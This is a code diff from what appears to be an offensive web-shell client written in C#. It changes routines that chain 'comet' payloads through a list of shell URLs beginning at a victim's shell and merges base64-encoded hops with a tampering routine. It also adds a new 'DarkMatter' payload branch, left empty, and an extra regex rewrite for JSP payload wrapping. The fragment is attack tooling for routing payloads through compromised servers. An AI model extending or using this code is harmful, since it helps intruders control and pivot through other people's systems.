@@ -1123,19 +1123,32 @@ namespace Alien
                 var config = lsConfig[i];
                 string szPassword = config.szPassword;
 
+                string szNextUrl = i == 0 ? m_victim.ShellURL : lsConfig[i - 1].szUrl;
+
+                if (config.payloadType == enPayloadType.DarkMatter)
+                {
+                    // NebulaPulsar
+
+                    byte[]? abTemplate = fnGetDarkMatter("comet");
+                    if (abTemplate == null)
+                        throw new Exception("Comet payload is null or empty.");
+
+
+
+                    continue;
+                }
+
                 string szSplitter = clsEzData.fnszGenerateRandomStr();
                 string szCurrentTemplate = await fnGetPayload(config, "comet", szSplitter);
 
                 if (string.IsNullOrEmpty(szCurrentTemplate))
                     throw new Exception("Comet payload is null or empty");
 
-                string szNextUrl = i == 0 ? m_victim.ShellURL : lsConfig[i - 1].szUrl;
-
                 if (config.bEHEnable)
                 {
                     string szMergedComet = clsTamper.fnMergePayloadToOne(
-                    config,
-                    szCurrentTemplate,
+                        config,
+                        szCurrentTemplate,
                         new string[] {
                             clsEzData.fnszStre2b64(szNextUrl),
                             clsEzData.fnszStre2b64(szCurrentPayload)
@@ -1427,6 +1440,7 @@ namespace Alien
         private static string fnWrapJSP(string szOriginalPayload, string szEncryptor)
         {
             string szProcessed = szOriginalPayload;
+            szProcessed = Regex.Replace(szProcessed, @"\boutput\s*\(", "Echo(", RegexOptions.IgnoreCase);
             szProcessed = Regex.Replace(szProcessed, @"\becho\s*\(", "Echo(", RegexOptions.IgnoreCase);
             szProcessed = Regex.Replace(szProcessed, @"\becho[ \t]+", "Echo ", RegexOptions.IgnoreCase);
 
